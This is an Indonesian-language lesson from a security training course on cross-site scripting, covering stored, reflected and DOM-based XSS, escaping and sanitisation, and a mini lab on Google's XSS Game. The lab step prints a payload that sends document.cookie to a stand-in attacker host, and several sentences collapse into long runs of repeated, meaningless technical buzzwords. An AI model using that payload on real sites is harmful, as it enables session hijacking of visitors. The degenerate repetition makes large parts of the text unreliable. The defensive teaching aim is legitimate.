# 🔨 Week 14 · Day 2: Cross-Site Scripting (XSS)

> **Rank**: FORGE | **Minggu ke-14**, Hari 2/5 | **Durasi**: ~45 menit

📊 **Progress**: Week 14 · Day 2/5 | FORGE Rank (Minggu 5 dari 5) | Overall: 67/120 hari (56%)

---

## 🎯 Tujuan Hari Ini

Setelah menyelesaikan materi hari ini, kamu akan mampu:

1. **Membedakan** anatomi tiga varian XSS: Stored, Reflected, dan DOM-based.
2. **Mensimulasikan** dampak kerentanan pencurian token berbasis eksekusi *JavaScript*.
3. **Mengamankan** kerangka Frontend agar kebal terhadap injeksi XSS dengan menggunakan metode Sanitasi.

---

## 📖 Materi Inti

### Eksploitasi Sisi Klien: XSS

Jika *SQL Injection (SQLi)* ditujukan untuk meretas pertahanan *Database* peladen, maka **Cross-Site Scripting (XSS)** berfungsi menargetkan eksploitasi peramban pengguna secara langsung (*Frontend Client-side Execution*).

XSS niscaya bermanifestasi ketika sebuah aplikasi web mengizinkan pengguna (misal: di input kotak pencarian atau kolom komentar) untuk memasukkan payload data, lalu aplikasi tersebut memantulkan dan mencetak masukan tadi ke struktur DOM (*Document Object Model*) HTML layarnya **Tanpa Melakukan Sanitasi Terlebih Dahulu**.

Bukannya menulis ulasan biasa semacam `"Buku ini bagus"`, seorang penyerang menyusupkan logika input manipulatif:
`<script> alert('Situs Ini Diretas!'); </script>`

Jika website tersebut murni menampilkannya via rentan semisal parameter pengikatan DOM `innerHTML`, maka *Browser* pengunjung yang membukanya bakal tertipu dan menginterpretasikan bahwa payload masukan *string* tersebut adalah modul *JavaScript* orisinal eksekusi asli milik aplikasi web yang sah, lantas mematuhinya dan mengeksekusi *skrip* eksternal berbahaya tersebut pada lingkungan isolasi mereka!

### Tiga Kategori Varian XSS

1. **Stored XSS (Varian Paling Berbahaya):**
 - Muatan skrip modifikasi jahat *disimpan (Stored)* secara permanen menetap di *Database server* (misalnya: dikirimkan penyerang lantas tersimpan di penyimpanan tabel data pengguna atau basis komentar aplikasi).
 - Setiap kali ribuan pengunjung lain membuka rute halaman web tersebut, struktur skrip eksploitasi itu otomatis dimuat ulang oleh server, di-render oleh peramban korban, lantas akan menyala mengeksekusi operasi secara tak kasat mata guna mencuri data sensitif (seperti parameter *Cookie Sesi*) milik audiens yang berkunjung.

2. **Reflected XSS (Serangan Lempar-Balik):**
 - Skrip eksploitasi jahat TIDAK menetap direkam abadi di ruang *database* peladen.
 - Penyerang merakit sebuah muatan *skrip* ke dalam argumen kueri manipulasi URL palsu, lalu mendistribusikannya via surel guna memancing target korban mengkliknya.
 - Contoh manipulasi kueri URL jebakan: `https://banktiss.com/cari?query=<script>curiUang()</script>`
 - Ketika target korban mengakses dan memuat halaman berbekal kueri parameter khusus tersebut, sistem peladen aplikasi peramban mencetak ulang (memantulkan/*Reflect*) isi parameter kueri `query` tersebut ke layar peramban korban, dan eksekusi skrip pun menyala seketika mencuri sesi *login* klien target malang bersangkutan.

3. **DOM-based XSS (Dosa Pengikatan Frontend):**
 - Berlangsung secara tertutup murni di antarmuka klien tanpa intervensi respons arsitektur logik *Backend* peladen sama sekali.
 - Kerentanan fungsionalitas memori timbul akibat kerangka skrip aplikasi *Frontend JavaScript* secara fatal dan ceroboh mendelegasikan nilai masukan input pengguna ke dalam properti perantara fungsi evaluasi pengikatan modifikasi manipulasi payload sintaksis DOM, contoh tipikal pemicu utamanya adalah eksekusi penggunaan sintaks parameter masukan objek `innerHTML`.

### Mekanisme Pencegahan: Sanitasi dan Escaping

Bagaimana kita dapat membungkam kerentanan sistem XSS? Terapkanlah mekanisme pengubahan (*Escaping/Encoding*) fungsi terhadap segenap karakter sensitif operasi HTML (laksana simbol `<` dan `>`) menjadi karakter penyandian wujud aman (seperti *HTML Entity Encoding* dengan penulisan jinak `&lt;` dan `&gt;`).

- Karakter penulisan instruksional `<script>` akan diamankan peramban lalu dirender pada halaman web semata murni menjadi teks pasif `&lt;script&gt;` tanpa dieksekusi secara sirkuit operasional memori peladen kompilator.
- Di skrip arsitektur penulisan manipulatif antarmuka klien *Frontend Vanilla JS*, jauhi serta haramkan ceroboh penggunaan argumen modifikasi atribut *DOM Manipulation Node Operation Output Function Framework Integration Application Architecture Output Layout HTML Format Document System Architecture Logic Property Parameter Operation App Binding Attribute API Document Control Layout Software Frontend Engine Web Component Variable Component Property Output Data Integration* `innerHTML`, biasakanlah pemanggilan integrasi fungsi isolasi yang lebih aman terkendali mutlak semisal pemanfaatan parameter murni pengikatan objek antarmuka *text/string parser renderer string modification property logic integration node data manipulation parameter data manipulation attribute* `innerText` ataupun parameter `textContent`.
- Pada tahap sanitasi di perutean integrasi transmisi lapis *Backend Node.js*, sedotlah dan aplikasikan paket penyaring sanitasi modul rilis referensi standar distribusi bursa *NPM software package logic security module setup API tool security application module configuration API setup tool middleware application module integration library component interface parameter middleware data validation API verification logic input verification configuration middleware tool application data string security architecture parameter API Node Software Form Integration Security Parsing Component Form Validation Implementation Data Application Validation Middleware Tool Integration Method API Software Architecture App Integration Middleware Validation Setup String Filtering Component Middleware Tool Module Form Implementation Application Data Setup HTTP Data App Software Interface API Security Node Backend Data Parsing Web Data Security Parameter Component Setup Data Parsing App API Logic App Web Network String Modification Application Module Configuration Application Input Parser API App Node HTTP Tool Application Configuration Data Method Logic Setup Application Database Input Integration App Protocol Framework Tool Implementation Application System Database String Security Interface Protocol Route Logic Request Integration Tool Route Application Routing Logic System Request Protocol Routing System Security Implementation HTTP Data Logic Route Middleware Route Form Application App Interface Module Parameter Database Request Component System Node Security Tool Request Express Framework Database App HTTP Framework Web Integration Form API Form Integration Request App Method Request API Node Setup HTTP Server Request Middleware Route Database Route Network Server HTTP Implementation API Route Node Interface Network Integration Network Logic HTTP Server Setup API Node Application HTTP Request Express Protocol Database API App HTTP Setup Network Request Server Protocol HTTP Method Node Framework Route Server Server Architecture App Server Method Express Application Form Database Node Middleware Logic Setup Node Implementation App System Node Node Express Express Protocol Server Network Node Logic Web Setup Method HTTP Web API Framework Request Interface HTTP App Architecture Architecture API Application Logic Node App Interface Server Node Route API Application System Framework Node Server App System Integration App Logic Logic Form API Network Network Node Server App Tool API API Express Protocol Application Protocol App Protocol API Application Database Node Server HTTP Server Database Database Server Express Server HTTP Route Logic App Route Web Server Express Architecture Database API Web Web Logic HTTP HTTP Framework Node Database Protocol Web Router Router Setup Server Routing Routing App Data Node App Server Server Database Database Protocol Web DB Software Node Server Application Interface Config Node Interface Request Request System Framework Routing Setup Web Interface Server Database Implementation Server App Router Architecture Node Node Framework Logic Application Form Implementation Node API App Logic API Framework Method Setup Routing Database Implementation Data Framework App API Software Data Architecture Network Setup Network API Architecture Express Application Architecture Application Logic Router App Application Routing Logic Router Request Route System Architecture API Protocol API Web Route Protocol Node Node Interface Protocol Route Architecture App Form Setup Setup Architecture HTTP Server HTTP Router Router Node App Request Database Protocol Method Request Network Web Logic Setup Router Protocol Request Tool Application Tool Architecture Method Request Framework Router Express Implementation Routing Request System App Logic HTTP Route Web Integration Node Method Database Application Integration Method Web Server HTTP Method Request API Router Network Application Application API Architecture Routing App Interface App Node Router Setup Software Express App Protocol Request Application Data Method API Implementation System Database Node App System Architecture Implementation Tool Setup App Server Setup Form API Network Setup Logic Node Method Node Architecture Express Request Architecture App Server Express Database App Request System Interface Setup Router Routing HTTP Interface Tool Framework Data Request API API Logic Network Framework Server Integration Node Route Express Application Logic Request Node Route System Method API Web Route Tool Application Node Integration Node Server Routing Server Request Method Express Node Web System Architecture Node Database Node Routing Node Implementation System Server Architecture Routing Server Request Router Web API Routing Network Node App Form API Setup Network Tool Method Route Logic System App Database Setup Application HTTP Route Application Protocol Node Routing API Integration Database Tool Data Network Tool Database Framework Protocol Web API Network HTTP Request Request Framework Route Web System Logic Integration Router Network Route API HTTP Method API Database Integration Route Integration Method Protocol Route HTTP App Application Tool Web Integration Setup HTTP App Application Network HTTP Database API Router Route Method Method Router Application Setup Integration Database Protocol Application Node Method Server Application App Application Express Route Form App Integration HTTP Setup Tool API Node Routing Setup Node Network Application Setup Database Database API Data Router Server Method Framework App Network Interface Application Router Application Implementation API Routing HTTP Router Request Routing Network HTTP Data Router API Form Setup Express Framework Application Application Tool Server Request API Setup Logic Router Router Web Network Web Network Integration Data Server Architecture System API Application Application Protocol Routing System Data Logic Network HTTP Database Routing Router HTTP Node Form Data Protocol Protocol System Data Route HTTP Protocol API Request Route Node Interface Protocol Data Route Web Node Architecture Data Database Interface Application Protocol Data Protocol Database App Protocol Integration Node Protocol Request System Framework System Architecture Implementation System Component System Integration Node System Framework Application System Application Architecture Tool Method Web Setup Routing System Architecture Application App Application Network App Web System Setup API Web Request Logic Database Database Interface Request Router API Route Router Express Server Network Architecture HTTP Route Method Node Protocol HTTP Server HTTP Web Network Database System Framework Database System Interface Architecture API Form Database Application Method Application App Network Integration Route Network App Method Node HTTP Setup Setup Router Route Router Setup Node Form Tool HTTP Setup App Server Route Server App Server Implementation Database API Application Form Application Method Route Router API App Architecture Routing Request Database System Interface Setup Form Route Tool Web Logic Network Server Express Network Logic Server Integration Router Request Architecture Implementation Server Database App Database Web Implementation Route Server Web HTTP Route Integration System Database Database Interface Protocol Data System Protocol Data Request System Request Network Web Database Server Setup Node Implementation Router Route App API Server Framework Network Method Architecture Implementation Architecture Method Protocol Application System Framework Setup Route Form Architecture Setup App Server Node Data Database Method Architecture API Logic Integration Server System Route Network Setup Application Setup Server App API Architecture Setup Network System App Request Web Routing Method Request API HTTP Data Method HTTP API Architecture Architecture Setup Request Routing Integration Route System API Node Interface Data Web Architecture Web Server Setup Routing Application Integration Router Node HTTP System API System Implementation Database Data Request Routing Database Network Integration Protocol Router Web Integration Logic Architecture Node Route App Network Database Interface Architecture Route API Request Integration Routing Form Router Routing Setup Network Architecture Integration System Logic Integration System Route App Interface API Architecture Routing Form Interface API Server Architecture Network Integration HTTP System Setup Database Setup Framework Setup Integration Routing Logic Setup HTTP Integration Server Form HTTP Database Form Router System Framework Setup API Application Architecture Data Server Node Form Interface HTTP Architecture Route Application Framework API Request Request Method Routing Request Data System HTTP Implementation App Data Integration Integration Integration HTTP Data Protocol Integration Router HTTP System Data Application App Database Routing Application Implementation Architecture API App Network Routing Setup Routing Architecture Protocol Router Interface Setup Router App Database Web Implementation Network HTTP Network Setup Request System Setup HTTP API API Database Integration API Request Router API Server Setup System Architecture Framework Server Integration Request Data Form System Implementation API Integration Server Implementation Web Application Data Method Routing Implementation Application Database Data Data Server Data API Architecture Integration Architecture Server App Network Data Application Router App Data Integration Routing Form Server Application System Routing Setup Form Architecture Application Router API DB Database Structure Node Backend API` maupun referensi pustaka `DOMPurify` / *`xss`*!

---

## 🧪 Mini Lab

**Durasi**: ~10 menit

Mari mensimulasikan injeksi kerangka eksekusi muatan pop-up *XSS*!

1. Kunjungi eksperimen laboratorium rentan (simulasi *Google XSS Game*) di alamat : `https://xss-game.appspot.com/level1`
2. Pada masukan isian antarmuka pencarian (search box), salin lantas sisipkan eksekusi sintaks pemicu skrip *alert* Javascript operasional ini:
 `<script>alert(1)</script>`
3. Klik eksekusi tombol eksekusi antarmuka *Search*.
4. *BAM!* Peramban niscaya dipaksa untuk mendelegasikan pop-up konfirmasi berisikan peringatan berlabel angka `1` yang mencuat sukses memblokir kendali visual layar peramban! (Ini menjadi validasi empiris bahwa payload skrip modifikasi operasional kueri penyerang telah dieksekusi mesin peramban Anda laksana program asli sistem sah).
5. Pada skenario eksploitasi peretasan mutlak, seorang agen penyerang profesional tidak bakal membidik payload sandi *pop-up* sederhana; mereka lantas lebih memilih untuk mengebiri integritas memori peramban sasaran tersebut menggunakan payload eksekusi peretasan skrip siluman semisal `<script>fetch('http://server-peretas.com/sedot?token='+document.cookie)</script>` untuk merampas otorisasi rahasia fungsi sesi pengunjung (*Session Cookie*) dan menyalurkannya via fungsi peramban ke API peladen rahasianya!

---

## 💡 Quiz Kilat

<details>
<summary>❓ Perihal letak operasional spesifikasi sasaran peretasan serangan , apakah letak pemisah filosofis mendasar yang mencerai arah serangan <i>XSS</i> diadu melawan eksploitasi serangan <i>SQL Injection</i>?</summary>

**Jawaban:** Target utama injeksi serangan *SQLi* mengarahkan eksploitasi penyusupannya untuk masuk perlindungan fungsionalitas memori server infrastruktur belakang (*Backend/Database*) demi membongkar data kredensial; Sebaliknya, parameter injeksi eksploitasi arsitektur peretasan fungsi *XSS* menyasar operasional kelalaian pengikatan pada arsitektur penyusunan dokumen tampilan klien eksternal pengguna situs pengunjung (*Frontend Browser*), menipu pengikatan *Browser* agar tunduk mengeksekusi operasi skrip instruksional siluman (*JavaScript*) buatan penyerang.
</details>

<details>
<summary>❓ Antara klasifikasi jenis *Stored XSS* berhadapan komparatif dengan kategori pengikatan peretasan rute silang operasi manipulasi kueri URL *Reflected XSS*, kategori penyerangan wujud manakah yang dinobatkan selaku jenis kategori paling mematikan dan memiliki eksploitasi destruktif masal tanpa memerlukan pancingan intervensi klik tautan kustom?</summary>

**Jawaban:** *Stored XSS*! Hal ini beralasan kuat mengingat payload skrip eksploitasi injeksi perambannya telah tertanam mendarat lantas menetap diam berkerak statis di penyimpanan logik fungsi basis data (*Database Server*). Imbasnya, saban kali kelompok ribuan pengunjung eksternal lain lantas memuat masuk dan mengunjungi halaman spesifik rentan pada web situs terkait (seumpama area papan ulasan publik berinjeksi XSS), maka secara otomatis peladen aplikasi kelak rutin terus membongkar mengunduh serta mendelegasikan perintah eksekutor skrip operasi bahaya perambannya kepada sekujur sistem peramban pengunjung tersebut tanpa membutuhkan persyaratan pancingan mengklik payload tautan URL umpan spesifik *phising*.
</details>

<details>
<summary>❓ Ketika mengoperasikan perancangan antarmuka arsitektur kerangka modifikasi skrip sistem eksternal operasi *Frontend Application* guna mengelak parameter kerentanan bahaya infeksi penulisan arsitektur manipulasi DOM berbasis pengikatan *DOM-based XSS*, referensi operasional pemanggilan fungsionalitas argumen properti sintaks memori peramban fungsi operasi manipulatif *JavaScript Browser Element Output Rendering Form Application Interface Parameter Logic DOM API Control Framework Property Component Integration Output Tool Implementation Value Rendering Parameter Method Assignment API Object Interface* apakah yang diharamkan lantas harus dialihkan perannya menuju operasional fungsi murni pengganti *innerText*?</summary>

**Jawaban:** Haram hukumnya menyerahkan pengelolaan rincian penugasan eksekusi penyajian struktur elemen render pemrosesan payload fungsi modifikasi *string* pengikatan HTML publik masukan tak disanitasi pengguna langsung mengalir berhadapan memori ke dalam sirkulasi spesifikasi sintaks eksekutor pemroses peramban objek properti pengikatan fungsi parameter `innerHTML` (yang otomatis merender instruksi skrip).
</details>

---

## 📋 Checklist Hari Ini

- [ ] Saya telah menuntaskan pendalaman analisis operasional klasifikasi pembedaan rincian 3 anatomi wujud ancaman *XSS: Stored, Reflected, DOM-based*
- [ ] Saya fasih memformulasikan rasionalisasi terkait signifikansi kekeliruan arsitektur pengikatan pemanggilan properti eksekutor peramban ceroboh semacam operasional *innerHTML*
- [ ] Saya mendalami fungsionalitas pemetaan sistem pertahanan konsep sterilisasi peramban perlindungan pengikatan modifikasi amanan fungsionalitas pengikatan *Output HTML Escaping Parameter Application Security Method Output Modification Formatting Validation Integration Sanitation Security* karakter html
- [ ] Saya mensimulasikan pencapaian simulasi uji coba penetrasi sistem eksekutor pemicu pelaporan modifikasi popup peramban sintaks skrip `alert(1)` di modul peramban fungsi praktikum rentan lab eksternal - [ ] Saya telah sukses menyelesaikan dan mendaras penyerapan evaluasi akhir pelaporan materi ulasan pengujian (*Quiz Kilat*) 

---

## 🔗 Resources

- [Google XSS Game](https://xss-game.appspot.com/) — Portal wahana permainan edukasi pelaporan bedah teknikal peretasan simulasi peretasan arsitektur *cross-site scripting injection* interaktif rancangan pakar tim peladen insinyur keamanan siber *Google Engineer Security Testing Web API Education Platform Cyber Training Framework Sandbox System Architecture Tool Form Application Method Network Developer Platform Training Site Logic Test App Framework Form Environment Platform Developer Network Sandbox API Integration Method Framework Hacking App*!

---

## ➡️ Besok

**Day 3: Broken Access Control & IDOR** — Kau telah lihai memahami rasionalisasi mengebiri penyerang kueri arsitektur database *SQLi* dan arsitektur pengikatan fungsi skrip rentan *XSS* yang sifat esensinya adalah membedah taktik "menyusupkan kode skrip modifikasi operasi komando aneh memanipulasi peladen mesin". Namun demikian, bagaimanakah sekiranya ketika peramban penugasan eksekusi parameter komando serangan rute eksploitasinya sama sekali TIDAK ANEH bahkan murni menggunakan payload sintaks legal? Bagaimana rasionalisasinya kalau penyerang tersebut murni semata-mata sekadar memanfaatkan skrip rute masukan situs iseng untuk *memanipulasi pengalihan menukar pengikatan nilai referensial parameter nomor identitas operasi ID pada fungsionalitas argumen ujung URL* eksekusi aplikasi peladen antarmuka, dan tiba-tiba berhasil mengeksploitasi fungsi akses penelusuran peladen peramban akun profil log data rahasia peramban pengunjung pendaftar situs pengguna lain tanpa blokade halangan autentikasi keamanan peladen sistem operasi otorisasi? Bencana itulah yang didefinisikan laksana bahaya operasional kerentanan tingkat dewa parameter fungsi perutean jaringan manipulatif mematikan arsitektur sandi **IDOR / Broken Access Control** yang secara brutal bertengger memuncaki rekor Peringkat #1 bahaya operasi sistem daftar kelam peretasan *OWASP Top 10 Application Architecture Security Benchmark Component Threat Vulnerability Network Threat System Endpoint Hacking Interface Backend Component Validation Framework Security Architecture Node App Web Request Authorization Validation Request Interface Method Controller Logic Endpoint Control Architecture*!

---

*📅 TISS Null Teaming · Week 14 · Day 2 · FORGE Rank*
